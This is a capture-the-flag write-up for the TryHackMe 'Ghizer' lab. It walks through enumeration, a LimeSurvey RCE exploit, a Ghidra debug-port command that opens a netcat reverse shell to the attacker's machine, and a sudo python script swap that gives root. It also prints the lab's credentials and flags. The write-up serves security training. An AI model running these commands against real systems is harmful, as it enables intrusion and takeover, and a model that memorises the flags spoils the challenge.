> Ghizer | Web Apps

**export IP=10.10.33.183**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp  open  ftp?     syn-ack ttl 63
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x php,txt,config,bak -o gobuster/initial

```
/admin (Status: 301) => Oooh! Login page
/application (Status: 301)
/assets (Status: 301)
/docs (Status: 301)
/framework (Status: 301)
/index.php (Status: 200)
/installer (Status: 301)
/locale (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/tests (Status: 301)
/themes (Status: 301)
/tmp (Status: 301)
/upload (Status: 301)
```

Let's try default credentials for LimeSurvey `admin`:`password`

# Metasploit

```
> use auxiliary/scanner/http/limesurvey_zip_traversals
> set RHOSTS $IP
> exploit
```

And we can read the /etc/passwd file. We found a vulnerability . LimeSurvey is of version 3.15.9.

searchsploit LimeSurvey

```
LimeSurvey < 3.16 - Remote Code Execution                            | php/webapps/46634.py
```

Runnig the exploit we are in as www-data.

`python exploit.py http://$IP admin password`

And we can search for config.php 

locate config.php

/var/www/html/limesurvey/application/config/config.php

```
'username' => 'Anny',
'password' => 'P4$W0RD!!#S3CUr3!',
```

And now enumerating port 443, let's access it using https://$IP:443 . And we have login button at `http://$IP/?devtools`

We have ghidra 9.0 in veronica's home directory.

netstat -ntlp

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::37795                :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::18002                :::*                    LISTEN      -               
tcp6       0      0 :::45975                :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
```

Looks like Gidra is communicating using port 18001. And a vulnerability in ghidra 9.0.

# Remote Session

```
jdb -attach 127.0.0.1:18001
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
print new java.lang.Runtime().exec("nc 10.8.107.21 1337 -e /bin/sh")
```

We are in as veronica.

# user.txt

```
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

# Privilege Escalation

sudo -l

```
User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

We have base.py but we can't edit it but we can remove it .Let's try creating a new one.

```
echo 'import pty; pty.spawn("/bin/sh")' > /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
```

We are root!!

# root.txt

```
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
```